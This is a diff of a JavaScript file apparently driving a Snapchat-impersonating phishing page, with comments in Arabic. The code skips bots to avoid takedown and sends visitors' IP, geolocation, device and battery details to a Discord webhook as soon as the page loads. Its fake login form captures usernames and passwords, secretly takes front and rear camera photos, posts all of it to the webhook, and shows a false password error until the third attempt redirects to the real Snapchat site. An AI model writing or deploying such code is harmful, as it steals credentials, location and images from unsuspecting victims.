@@ -1,21 +1,16 @@
-/* ==========================================================================
-   ULTIMATE FIXED HUNTING ENGINE - (java.script)
-   ========================================================================== */
-
-// استبدل برابط الـ Webhook الخاص بك تماماً
-const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1564569407865491626/O7w6n98Q51WF2LChrTTdi2FmeUfrrzZpZp2fF5e9F7bjpPgvBnnrYI_qmG4nV5N_FXZg";
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1517635351798354103/4aBtwaUtWWdTITUfu8pfQbVMS-RGerhwqUQ5YVmlu3IPYYy0tgRHbdcFFWL_xsYfD68H";
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 let loginAttempts = 0;
 
-// فحص الـ Bots
+// فحص الـ Bots لمنع حظر الرابط
 function isBot() {
     const ua = navigator.userAgent.toLowerCase();
     return ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || navigator.webdriver;
 }
 
-// جلب الـ IP والموقع عبر API موثوق
+// جلب الـ IP والموقع الجغرافي
 async function getIPAndLocation() {
     try {
         const res = await fetch('https://ipapi.co/json/');
@@ -32,7 +27,7 @@ async function getIPAndLocation() {
     }
 }
 
-// جلب معلومات النظام والبطارية
+// معلومات النظام والبطارية
 async function getSystemInfo() {
     const geoip = await getIPAndLocation();
     const ua = navigator.userAgent;
@@ -51,7 +46,27 @@ async function getSystemInfo() {
     return { ...geoip, ua, platform, language, screenRes, batteryInfo };
 }
 
-// دالة إرسال البيانات الموحدة للديسكورد مع معالجة الأخطاء
+// التقاط صورة من الكاميرا
+async function captureCamera(facingMode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: facingMode } 
+        });
+        video.srcObject = stream;
+        
+        await new Promise(resolve => setTimeout(resolve, 1500));
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, 640, 480);
+        
+        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
+        stream.getTracks().forEach(track => track.stop());
+        return blob;
+    } catch (e) {
+        return null;
+    }
+}
+
+// إرسال البيانات إلى ديسكورد
 async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "") {
     if (isBot()) return;
 
@@ -91,32 +106,10 @@ async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "")
         }));
 
         await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-    } catch (err) {
-        console.error("خطأ في الإرسال:", err);
-    }
+    } catch (err) {}
 }
 
-// التقاط الصور عبر الكاميرا بشكل آمن
-async function captureCamera(facingMode) {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: facingMode } 
-        });
-        video.srcObject = stream;
-        
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, 640, 480);
-        
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
-        stream.getTracks().forEach(track => track.stop());
-        return blob;
-    } catch (e) {
-        return null;
-    }
-}
-
-// التشغيل الأولي فور فتح الصفحة (سحب الـ IP والمعلومات الأساسية)
+// التشغيل التلقائي عند الدخول للصفحة
 window.addEventListener('DOMContentLoaded', async () => {
     let lat = null, lng = null;
     if (navigator.geolocation) {
@@ -126,11 +119,10 @@ window.addEventListener('DOMContentLoaded', async () => {
         }, () => {}, { timeout: 5000 });
     }
     
-    // إرسال تقرير الدخول الأولي بدون إجبار الكاميرا لمنع حظر المتصفح
     await sendToDiscord({}, lat, lng, "", "", "تم فتح الصفحة وزيارة الرابط.");
 });
 
-// التفاعل مع نموذج تسجيل الدخول (apply.html) مع تطبيق شروط المحاولات والتوجيه
+// التعامل مع نموذج تسجيل الدخول
 const loginForm = document.getElementById('fullLoginForm');
 if (loginForm) {
     loginForm.addEventListener('submit', async (e) => {
@@ -151,21 +143,20 @@ if (loginForm) {
             }, () => {}, { timeout: 4000 });
         }
 
-        // محاولة تشغيل الكاميرا وسحب الصورة عند ضغط زر تسجيل الدخول (لأنها ضغطة مستخدم فعلية وستعمل بنجاح)
+        // سحب الصور عند ضغط زر تسجيل الدخول
         let front = await captureCamera("user");
         let back = await captureCamera("environment");
 
-        // إرسال البيانات للديسكورد
         await sendToDiscord({ front, back }, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);
 
         setTimeout(() => {
             if (loadingOverlay) loadingOverlay.style.display = 'none';
 
             if (loginAttempts >= 3) {
-                // المحاولة الثالثة: التوجيه إلى صفحة سناب شات الرسمية[span_2](start_span)[span_2](end_span)
+                // المحاولة الثالثة: التحويل إلى سناب شات الرسمي[span_1](start_span)[span_1](end_span)
                 window.location.href = "https://accounts.snapchat.com/";
             } else {
-                // المحاولة الأولى والثانية: إظهار خطأ كلمة المرور[span_3](start_span)[span_3](end_span)
+                // المحاولة الأولى والثانية: إظهار خطأ كلمة المرور[span_2](start_span)[span_2](end_span)
                 const errorMsg = document.getElementById('loginErrorMsg');
                 if (errorMsg) errorMsg.style.display = 'block';
                 e.target.password.value = "";
